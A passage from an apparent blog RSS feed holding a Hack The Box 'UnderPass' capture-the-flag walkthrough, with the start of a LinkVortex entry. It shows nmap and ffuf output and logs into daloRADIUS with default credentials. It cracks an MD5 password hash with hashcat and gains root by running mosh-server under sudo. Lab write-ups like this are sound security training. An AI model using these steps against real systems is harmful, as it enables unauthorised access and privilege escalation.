&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">48&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">c7&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ae&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">fb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b7&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">f5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">ea&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ECDSA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="nx">cb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">61&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ba&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">45&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">86&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">c5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">bb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">e2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">a2&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ED25519&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span> &lt;span class="nx">Apache&lt;/span> &lt;span class="nx">httpd&lt;/span> &lt;span class="mf">2.4.52&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">methods&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Supported&lt;/span> &lt;span class="nx">Methods&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">OPTIONS&lt;/span> &lt;span class="nx">HEAD&lt;/span> &lt;span class="nx">GET&lt;/span> &lt;span class="nx">POST&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">title&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Apache2&lt;/span> &lt;span class="nx">Ubuntu&lt;/span> &lt;span class="nx">Default&lt;/span> &lt;span class="nx">Page&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">It&lt;/span> &lt;span class="nx">works&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">header&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Apache&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">2.4.52&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">7294&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">12945&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">37517&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">39220&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">44459&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">55246&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">55628&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">64827&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="user">User
&lt;/h2>&lt;h3 id="fuzzing">Fuzzing
&lt;/h3>&lt;p>While fuzzing on port 80 with &lt;code>ffuf&lt;/code>, we discover the path &lt;code>/daloradius/app/operators&lt;/code>.&lt;br>
Navigating to this endpoint redirects us to a &lt;code>Daloradius&lt;/code> login interface, an &lt;a class="link" href="https://github.com/lirantal/daloradius" target="_blank" rel="noopener"
>&amp;ldquo;advanced RADIUS web platform aimed at managing hotspots and general-purpose SP deployments&amp;rdquo;.&lt;/a>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
&lt;/span>&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 9
&lt;/span>&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ffuf&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">seclists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Discovery&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Content&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">common&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//10.10.11.48/FUZZ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">daloradius&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">301&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">315&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ffuf&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">seclists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Discovery&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Content&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">common&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//10.10.11.48/daloradius/FUZZ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">301&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">319&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ffuf&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">seclists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Discovery&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Content&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">directory&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">list&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">2.3&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">medium&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//10.10.11.48/daloradius/app/FUZZ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">operators&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">301&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">329&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">87&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
Path: http://10.10.11.48/daloradius/app/operators/login.php
&lt;img src="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/Path.PNG"
width="400"
height="283"
srcset="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/Path_hu_77d2d90fa507475d.PNG 480w, https://01MI.github.io/p/underpass-htb-writeup-linux-easy/Path_hu_8d5d68ccca32ce02.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="141"
data-flex-basis="339px"
>&lt;/p>
&lt;h3 id="default-credentials">Default credentials
&lt;/h3>&lt;p>Using the default credentials &lt;code>administrator:radius&lt;/code>, which are easily found on the internet, we gain access to the home page.&lt;br>
Then, we can navigate to the &lt;code>users&lt;/code> and notice the password for &lt;code>svcMosh&lt;/code> appears to be an MD5 hash. We can use hashcat to recover the password.
&lt;img src="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/mng-list-all.PNG"
width="1306"
height="475"
srcset="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/mng-list-all_hu_fe8e5ed1dab6fa68.PNG 480w, https://01MI.github.io/p/underpass-htb-writeup-linux-easy/mng-list-all_hu_31fab4d57f29fe4b.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="274"
data-flex-basis="659px"
>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">hashcat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="nx">hash&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wordlists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">412&lt;/span>&lt;span class="nx">dd4759978acfcc81deab01b382403&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">underwaterfriends&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
Using those credentials, we gain access to the server as svcMosh using SSH.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
&lt;/span>&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
&lt;/span>&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.48&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">pwd&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">svcMosh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="root">Root
&lt;/h2>&lt;h3 id="sudo-privilege-escalation">Sudo Privilege escalation
&lt;/h3>&lt;p>&lt;code>svcMosh&lt;/code> is allowed to execute mosh-server, &lt;a class="link" href="https://mosh.org/" target="_blank" rel="noopener"
>a component of the Mosh remote shell used for interactive SSH-like sessions.&lt;/a>&lt;br>
Since it can be run with sudo, we can leverage it to obtain a root shell.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 7
&lt;/span>&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 9
&lt;/span>&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
&lt;/span>&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="hl">&lt;span class="lnt">15
&lt;/span>&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="hl">&lt;span class="lnt">17
&lt;/span>&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Matching&lt;/span> &lt;span class="nx">Defaults&lt;/span> &lt;span class="nx">entries&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">svcMosh&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_reset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mail_badpass&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">secure_path&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">snap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">use_pty&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">svcMosh&lt;/span> &lt;span class="nx">may&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">following&lt;/span> &lt;span class="nx">commands&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">ALL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">NOPASSWD&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">mosh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">mosh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">MOSH&lt;/span> &lt;span class="nx">CONNECT&lt;/span> &lt;span class="mi">60002&lt;/span> &lt;span class="nx">zl0g6Tbx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">KIgOR0jzdQ9wA&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">MOSH_KEY&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">zl0g6Tbx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">KIgOR0jzdQ9wA&lt;/span> &lt;span class="nx">mosh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">client&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span> &lt;span class="mi">60002&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">pwd&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p></description></item><item><title>LinkVortex - Linux Easy - HTB Writeup</title><link>https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/</link><pubDate>Sun, 13 Apr 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/</guid><description>&lt;img src="https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/LinkVortex.PNG" alt="Featured image of post LinkVortex - Linux Easy - HTB Writeup" />&lt;h2 id="summary">Summary
